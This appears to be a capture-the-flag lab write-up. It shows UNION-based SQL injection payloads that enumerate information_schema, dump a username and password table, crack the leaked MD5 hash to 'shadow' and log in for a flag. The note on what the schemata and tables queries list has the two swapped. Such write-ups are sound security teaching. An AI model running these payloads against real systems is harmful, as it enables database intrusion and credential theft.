During our first sql injection, we took a good look at the database.
By displaying all the possible columns of all the possible tables.
We know that a table contains username / password:

1 UNION SELECT COLUMN_NAME,NULL FROM information_schema.columns --

ID: 1 UNION SELECT COLUMN_NAME,NULL FROM information_schema.columns -- 
Title: 
Url : username
ID: 1 UNION SELECT COLUMN_NAME,NULL FROM information_schema.columns -- 
Title: 
Url : password

We need to find the name of this table, we display all the tables with:
1 UNION SELECT SCHEMA_NAME,NULL FROM information_schema.schemata--

Then the name of each database with:
1 UNION SELECT TABLE_NAME,NULL FROM information_schema.tables--

Now with several tests we understand that the password / username comes from the Member_Brute_Force:
1  UNION SELECT password,username from Member_Brute_Force.db_default --

We get the same password on two lines for root and admin: 3bf1114a986ba87ed28fc1b5884fc2f8
puting it on a password cracker (crackstation.net) we get a password 'shadow'

works with any username on the login page.
We login and we have a flag.
